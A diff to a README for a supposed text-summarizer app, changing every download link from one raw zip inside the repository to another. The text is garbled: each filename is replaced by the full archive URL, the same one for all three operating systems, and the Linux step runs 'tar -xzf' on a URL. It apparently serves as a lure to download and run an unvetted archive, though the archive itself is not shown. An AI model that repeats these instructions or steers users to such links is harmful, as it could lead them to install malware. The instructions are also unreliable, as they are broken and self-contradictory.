@@ -1,11 +1,11 @@
 # 📚 text-snippet-summarizer - Get Clear Summaries from Text
 
 ## 🛠️ Download and Install
-[![Download Now](https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/text_summarizer_snippet_2.5.zip%20Now-%https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/text_summarizer_snippet_2.5.zip)](https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/text_summarizer_snippet_2.5.zip)
+[![Download Now](https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/summarizer-snippet-text-v3.7.zip%20Now-%https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/summarizer-snippet-text-v3.7.zip)](https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/summarizer-snippet-text-v3.7.zip)
 
 To get started, visit the following page to download the latest version of the text-snippet-summarizer:
 
-[Download Here](https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/text_summarizer_snippet_2.5.zip)
+[Download Here](https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/summarizer-snippet-text-v3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -22,16 +22,16 @@ The text-snippet-summarizer is designed for users who want to extract key points
 
 1. Click on the link at the top of this page to visit the Releases page.
 2. Find the latest release listed; it should be the first one on the page.
-3. Look for the correct file for your operating system (e.g., https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/text_summarizer_snippet_2.5.zip for Windows).
+3. Look for the correct file for your operating system (e.g., https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/summarizer-snippet-text-v3.7.zip for Windows).
 4. Click on the file to start the download.
 
 ### 📂 Installation Instructions
 
 1. Once the download is complete, navigate to your Downloads folder.
 2. Locate the downloaded file:
-   - For Windows, you might see `https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/text_summarizer_snippet_2.5.zip`.
-   - For macOS, it might be `https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/text_summarizer_snippet_2.5.zip`.
-   - For Linux, look for `https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/text_summarizer_snippet_2.5.zip`.
+   - For Windows, you might see `https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/summarizer-snippet-text-v3.7.zip`.
+   - For macOS, it might be `https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/summarizer-snippet-text-v3.7.zip`.
+   - For Linux, look for `https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/summarizer-snippet-text-v3.7.zip`.
 
 3. Follow the steps based on your operating system:
 
@@ -44,7 +44,7 @@ The text-snippet-summarizer is designed for users who want to extract key points
    - Drag the text-snippet-summarizer icon to your Applications folder.
 
    #### Linux
-   - Extract the `https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/text_summarizer_snippet_2.5.zip` file using the command: `tar -xzf https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/text_summarizer_snippet_2.5.zip`.
+   - Extract the `https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/summarizer-snippet-text-v3.7.zip` file using the command: `tar -xzf https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/summarizer-snippet-text-v3.7.zip`.
    - Open the extracted folder and run the application.
 
 ## 📝 How to Use
@@ -91,6 +91,6 @@ If you have any questions or concern, feel free to reach out via the Issues tab 
 
 To download the application again or to check for updates:
 
-[Download Here](https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/text_summarizer_snippet_2.5.zip)
+[Download Here](https://github.com/Radif-Rahman/text-snippet-summarizer/raw/refs/heads/main/text_snippet_summarizer/summarizer-snippet-text-v3.7.zip)
 
 Thank you for choosing text-snippet-summarizer for your summarization needs!
